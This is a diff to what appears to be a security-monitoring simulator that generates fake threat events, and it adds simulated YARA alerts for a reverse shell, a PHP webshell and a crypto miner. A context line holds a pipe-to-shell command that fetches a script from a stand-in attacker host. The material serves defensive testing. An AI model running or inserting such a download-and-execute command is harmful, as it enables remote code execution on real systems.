@@ -99,6 +99,18 @@ class SimulatorCollector(Collector):
                                 "http://evil.example/x.sh | sh (sim)",
                         tags={"edge", "lolbin", "T1059"}),
                 ])
+            elif roll < 0.985:
+                ev = ThreatEvent(
+                    kind="yara_match", severity=Severity.CRITICAL,
+                    message=random.choice([
+                        "YARA 'Reverse_Shell_OneLiner' en "
+                        f"/tmp/.x{random.randint(100,999)} (sim)",
+                        "YARA 'PHP_Webshell' — eval de entrada del cliente "
+                        "en /dev/shm/up.php (sim)",
+                        "YARA 'Crypto_Miner_Config' — stratum+tcp en "
+                        f"/tmp/cfg{random.randint(10,99)}.json (sim)",
+                    ]),
+                    tags={"yara", "signature"})
             else:
                 ev = ThreatEvent(
                     kind="login_success", src_ip=ip, user="admin",
